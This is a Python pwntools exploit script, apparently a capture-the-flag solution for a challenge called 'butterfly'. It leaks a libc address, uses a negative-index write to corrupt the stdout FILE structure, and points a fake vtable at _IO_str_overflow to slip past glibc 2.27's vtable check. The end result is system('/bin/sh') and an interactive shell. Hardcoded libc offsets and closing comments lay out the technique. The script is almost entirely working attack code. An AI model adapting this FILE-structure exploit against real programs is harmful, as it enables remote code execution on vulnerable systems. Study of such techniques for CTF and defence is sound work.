#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
from IO_FILE import *
import random

####Addr
leak_offset = 0x1b39e7
system = 0x4f4e0
str_binsh = 0x1b40fa
_IO_list_all = 0x3ec660
_IO_file_jumps = 0x3e82a0
_IO_str_jumps = _IO_file_jumps+0xc0
_IO_str_overflow = _IO_str_jumps+0x18

####Exploit
if __name__=='__main__':
	io = process('./distribute/challenge_bin/butterfly')
#	io = remote('butterfly.darkarmy.xyz',32770)
	io.sendafter('name: ','A'*0x50)
	libc_leak = u64(io.recvline()[0x50:].strip().ljust(8,b'\x00'))
	libc_base = libc_leak - leak_offset
	print(f'Libc: {libc_base:x}')

	io.sendlineafter('to write: ','-6')
	IO_file = IO_FILE_plus(arch=64)

	stream = IO_file.construct(
		flags=0,buf_base=0,
		buf_end=(libc_base+str_binsh-100)//2,write_ptr=(libc_base+str_binsh-100)//2,
		write_base=0,
		lock=libc_base+_IO_list_all+0x8,
		vtable=libc_base+_IO_str_overflow-0x38)
	stream += p64(libc_base+system)

	io.sendafter('data: ',stream)
	io.interactive()

# Negative index can write into stdout structure
# puts calls a vtable pointer from _IO_file_jumps
# We can change the vtable pointer to _IO_str_overflow-0x38
# This bypass the vtable check
# _IO_str_overflow can get shell.
' Refrences '
# https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/bits/libio.h#L245
# https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/strops.c#L81
